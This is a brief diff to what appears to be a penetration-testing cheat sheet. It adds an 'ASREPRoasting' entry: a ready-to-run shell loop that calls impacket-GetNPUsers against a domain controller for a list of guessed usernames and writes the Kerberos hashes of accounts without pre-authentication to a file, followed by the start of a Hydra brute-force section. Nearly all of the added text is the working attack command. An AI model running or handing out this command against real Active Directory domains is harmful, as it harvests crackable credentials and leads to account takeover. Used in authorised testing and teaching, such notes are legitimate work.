@@ -1,3 +1,12 @@
+# ASREPRoasting
+
+Extract hashes from user accounts that do not require pre-authentication
+```
+unames.txt can be generated with a tool like Username Anarchy, etc.
+
+while read u; do impacket-GetNPUsers fqdn/"$u" -request -no-pass -dc-ip ipaddress >> hashes.txt; done < unames.txt
+```
+
 # Hydra
 
 Brute Force Service
